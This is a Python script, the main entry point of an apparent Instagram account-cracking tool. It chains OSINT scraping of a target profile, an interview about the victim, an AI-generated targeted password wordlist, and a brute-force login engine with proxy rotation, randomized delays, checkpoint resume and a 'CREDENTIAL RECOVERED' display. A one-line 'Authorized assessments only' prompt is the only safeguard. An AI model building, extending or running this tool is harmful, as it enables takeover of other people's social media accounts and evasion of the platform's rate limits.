#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Instagram Security Testing Tool
OSINT → Interview → Targeted AI Wordlist → Brute Force (live progress)
"""

import os
import sys
from core.banner import (
    C,
    show_banner,
    clear,
    info,
    ok,
    warn,
    err,
    step,
    ask,
    yesno,
    menu,
)
from core.osint import OSINT
from core.interviewer import Interviewer
from core.wordlist import WordlistAI
from core.brute import BruteEngine
from core.api import InstagramAPI


def count_lines(path):
    try:
        with open(path, "r", encoding="utf-8", errors="ignore") as f:
            return sum(1 for line in f if line.strip())
    except Exception:
        return 0


def merge_hints_into_answers(answers, hints, username):
    answers = dict(answers or {})
    hints = hints or {}
    answers["username"] = answers.get("username") or username
    answers["full_name"] = answers.get("full_name") or hints.get(
        "full_name", ""
    )
    answers["biography"] = hints.get(
        "biography", answers.get("biography", "")
    )
    answers["bio_tokens"] = hints.get("bio_tokens", [])
    answers["osint_tokens"] = hints.get("bio_tokens", [])
    answers["osint_years"] = hints.get("years", [])
    answers["years"] = hints.get("years", [])
    answers["phones"] = hints.get("phones", []) or answers.get("phones", [])
    answers["osint_phones"] = hints.get("phones", [])
    answers["user_parts"] = hints.get("user_parts", [])
    answers["stat_numbers"] = hints.get("stat_numbers", [])
    answers["followers"] = hints.get("followers", 0)
    answers["following"] = hints.get("following", 0)
    answers["posts"] = hints.get("posts", 0)
    answers["category"] = hints.get("category", "")
    answers["external_url"] = hints.get("external_url", "")
    return answers


def build_minimal_answers(username, hints):
    hints = hints or {"username": username}
    return merge_hints_into_answers(
        {"username": username, "full_name": hints.get("full_name", "")},
        hints,
        username,
    )


def run_osint(username, output_dir, proxy):
    sid = os.environ.get("IG_SESSIONID") or None
    bot = OSINT(username, output_dir, proxy, sessionid=sid)
    data = bot.scrape()
    hints = (
        bot.get_hints()
        if getattr(bot, "data", None)
        else {"username": username}
    )
    if not hints.get("username"):
        hints["username"] = username
    return bot, data, hints


def generate_wordlist(answers, output_dir, username, count=18000):
    path = os.path.join(output_dir, username, "wordlist.txt")
    ai = WordlistAI(answers, target_count=count)
    ai.generate()
    ai.save(path)
    ok(ai.report())
    ok(f"Saved → {path}")
    return path, ai.count


def confirm_attack(username, n):
    print(
        f"\n{C.R}  You are about to test {n} passwords against @{username}{C.E}"
    )
    print(f"{C.R}  Authorized assessments only.{C.E}")
    return yesno("Continue?", default_yes=False)


def main():
    clear()
    show_banner()

    print(f"{C.W}─── Target ───{C.E}\n")
    username = ask("Instagram username (@ or name)")
    if not username:
        err("Username required")
        sys.exit(1)
    username = username.strip().lstrip("@")

    output_dir = ask("Output directory", "output")
    os.makedirs(output_dir, exist_ok=True)
    os.makedirs(os.path.join(output_dir, username), exist_ok=True)

    proxy = ask("Proxy URL (ENTER to skip)", "")
    proxy_file = ask("Proxy list file (ENTER to skip)", "")
    if not proxy:
        proxy = None
    if not proxy_file:
        proxy_file = None

    sid = ask("Instagram sessionid cookie (ENTER skip)", "")
    if sid:
        os.environ["IG_SESSIONID"] = sid.strip()
        ok("sessionid saved for this run")
    elif os.environ.get("IG_SESSIONID"):
        info("Using IG_SESSIONID from environment")

    info(f"Checking @{username}...")
    api = InstagramAPI(proxy=proxy)
    exists = api.profile_exists(username)
    if exists is False:
        err(f"Account @{username} does not exist or is unreachable")
    elif exists:
        ok(f"Account @{username} exists")
    else:
        warn(f"Could not verify @{username} — continuing anyway")

    while True:
        choice = menu(
            [
                "OSINT — Profile intelligence gathering",
                "WORDLIST — OSINT + Interview + Targeted wordlist",
                "BRUTE FORCE — Test passwords (live progress)",
                "FULL ATTACK — OSINT → Interview → Wordlist → Brute",
                "RESUME — Continue previous attack",
                "PROXY CHECK — Validate proxies",
                "EXIT",
            ],
            f"@ {username}",
        )

        wl_path = os.path.join(output_dir, username, "wordlist.txt")

        if choice == 1:
            step(1, 1, "OSINT")
            bot, data, hints = run_osint(username, output_dir, proxy)
            if data:
                ok(f"Data saved → output/{username}/osint.json")
            else:
                warn("OSINT limited — use interview for better wordlist")
            ask("\nPress ENTER to return")
            clear()
            show_banner()
            continue

        if choice == 2:
            step(1, 3, "OSINT")
            bot, data, hints = run_osint(username, output_dir, proxy)

            step(2, 3, "INTERVIEW")
            if yesno("Run interview?", default_yes=True):
                answers = Interviewer(username, hints, output_dir).run()
            else:
                answers = build_minimal_answers(username, hints)
            answers = merge_hints_into_answers(answers, hints, username)

            step(3, 3, "TARGETED WORDLIST")
            cnt = ask("Wordlist size", "18000")
            try:
                cnt_n = int(cnt)
            except ValueError:
                cnt_n = 18000
            generate_wordlist(answers, output_dir, username, cnt_n)
            ask("\nPress ENTER to return")
            clear()
            show_banner()
            continue

        if choice == 3:
            if not os.path.isfile(wl_path):
                warn("No wordlist found")
                if yesno("Generate targeted wordlist now?"):
                    bot, data, hints = run_osint(
                        username, output_dir, proxy
                    )
                    if yesno("Run interview?"):
                        answers = Interviewer(
                            username, hints, output_dir
                        ).run()
                    else:
                        answers = build_minimal_answers(username, hints)
                    answers = merge_hints_into_answers(
                        answers, hints, username
                    )
                    wl_path, _ = generate_wordlist(
                        answers, output_dir, username, 18000
                    )
                else:
                    wl_path = ask("Wordlist path")
                    if not os.path.isfile(wl_path):
                        err("File not found")
                        continue

            n = count_lines(wl_path)
            if n == 0:
                err("Wordlist is empty")
                continue
            if not confirm_attack(username, n):
                warn("Aborted")
                continue

            dmin = ask("Min delay (seconds)", "3")
            dmax = ask("Max delay (seconds)", "5")
            try:
                dmin_f = float(dmin)
                dmax_f = float(dmax)
            except ValueError:
                dmin_f, dmax_f = 3.0, 5.0

            engine = BruteEngine(
                username,
                wl_path,
                output_dir,
                delay_min=dmin_f,
                delay_max=dmax_f,
                proxy=proxy,
                proxy_file=proxy_file,
            )
            found = engine.run()
            if found:
                print(f"\n{C.G}{'═' * 40}{C.E}")
                print(f"{C.G}  CREDENTIAL RECOVERED{C.E}")
                print(f"{C.G}{'═' * 40}{C.E}")
                print(f"  Username : {username}")
                print(f"  Password : {C.W}{found}{C.E}")
                print(f"  Saved    : output/{username}/found.txt")
            ask("\nPress ENTER to return")
            clear()
            show_banner()
            continue

        if choice == 4:
            step(1, 4, "OSINT")
            bot, data, hints = run_osint(username, output_dir, proxy)

            step(2, 4, "INTERVIEW")
            if yesno("Run interview?", default_yes=True):
                answers = Interviewer(username, hints, output_dir).run()
            else:
                answers = build_minimal_answers(username, hints)
            answers = merge_hints_into_answers(answers, hints, username)

            step(3, 4, "TARGETED WORDLIST")
            cnt = ask("Wordlist size", "18000")
            try:
                cnt_n = int(cnt)
            except ValueError:
                cnt_n = 18000
            wl_path, n = generate_wordlist(
                answers, output_dir, username, cnt_n
            )

            if not confirm_attack(username, n):
                warn("Attack skipped — wordlist saved")
                ask("\nPress ENTER to return")
                clear()
                show_banner()
                continue

            step(4, 4, "BRUTE FORCE")
            dmin = ask("Min delay (seconds)", "3")
            dmax = ask("Max delay (seconds)", "5")
            try:
                dmin_f = float(dmin)
                dmax_f = float(dmax)
            except ValueError:
                dmin_f, dmax_f = 3.0, 5.0

            engine = BruteEngine(
                username,
                wl_path,
                output_dir,
                delay_min=dmin_f,
                delay_max=dmax_f,
                proxy=proxy,
                proxy_file=proxy_file,
            )
            found = engine.run()
            if found:
                print(f"\n{C.G}{'═' * 40}{C.E}")
                print(f"{C.G}  CREDENTIAL RECOVERED{C.E}")
                print(f"{C.G}{'═' * 40}{C.E}")
                print(f"  Username : {username}")
                print(f"  Password : {C.W}{found}{C.E}")
            ask("\nPress ENTER to return")
            clear()
            show_banner()
            continue

        if choice == 5:
            progress = os.path.join(
                output_dir, username, "progress.json"
            )
            if not os.path.isfile(progress):
                err("No progress file — nothing to resume")
                ask("Press ENTER to return")
                continue
            if not os.path.isfile(wl_path):
                err(f"Wordlist missing: {wl_path}")
                ask("Press ENTER to return")
                continue

            info("Resuming from checkpoint...")
            engine = BruteEngine(
                username,
                wl_path,
                output_dir,
                proxy=proxy,
                proxy_file=proxy_file,
                resume=True,
            )
            found = engine.run()
            if found:
                print(f"\n{C.G}  RECOVERED: {found}{C.E}")
            ask("\nPress ENTER to return")
            clear()
            show_banner()
            continue

        if choice == 6:
            from core.proxy import ProxyManager

            pm = ProxyManager(proxy_file=proxy_file, proxy_url=proxy)
            if pm.count == 0:
                warn("No proxies configured")
            else:
                info(f"Testing {pm.count} proxies...")
                alive = pm.validate_all()
                for p in pm._alive:
                    print(
                        f"  {C.G}ALIVE{C.E}  {p['url']} ({p['latency']:.2f}s)"
                    )
                for p in pm._dead:
                    print(f"  {C.R}DEAD{C.E}   {p}")
                ok(f"{alive}/{pm.count} proxies alive")
            ask("\nPress ENTER to return")
            clear()
            show_banner()
            continue

        if choice == 7:
            print(f"\n{C.C}  Goodbye!{C.E}\n")
            sys.exit(0)


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{C.Y}[!] Interrupted{C.E}")
        sys.exit(0)
